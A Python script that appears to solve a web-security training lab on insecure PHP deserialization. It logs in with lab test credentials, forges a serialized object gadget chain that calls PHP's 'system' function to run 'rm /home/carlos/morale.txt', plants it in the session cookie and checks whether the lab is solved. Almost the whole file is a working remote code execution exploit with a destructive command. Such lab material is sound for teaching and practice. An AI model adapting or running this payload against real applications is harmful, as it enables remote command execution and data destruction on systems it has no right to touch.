import requests
import sys
import urllib3, urllib.parse
from bs4 import BeautifulSoup
import base64
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def url_encode(str):
    return urllib.parse.quote(str)

def url_decode(str):
    return urllib.parse.unquote(str)

def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, path, username, password):
    login_url = url + path
    payload = {
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, headers=headers, allow_redirects=False)
    if r.status_code == 302:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def insecure_serialized(s, payload):
    new_serialized_obj = payload
    b64_encoded = base64.b64encode(new_serialized_obj.encode('utf-8'))
    url_encoded = url_encode(b64_encoded.decode())
    s.cookies['session'] = url_encoded
    print(f'[+] Changed serialize object to {new_serialized_obj}')

def goto(s, url, path):
    target_url = url + path
    r = s.get(target_url)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)
        
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 

    username = 'wiener'
    password = 'peter'

    login_acc(s, url, '/login', username, password)
    payload = "O:14:\"CustomTemplate\":2:{s:17:\"default_desc_type\";s:26:\"rm /home/carlos/morale.txt\";s:4:\"desc\";O:10:\"DefaultMap\":1:{s:8:\"callback\";s:6:\"system\";}}"
    insecure_serialized(s, payload)
    goto(s, url, '/')
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()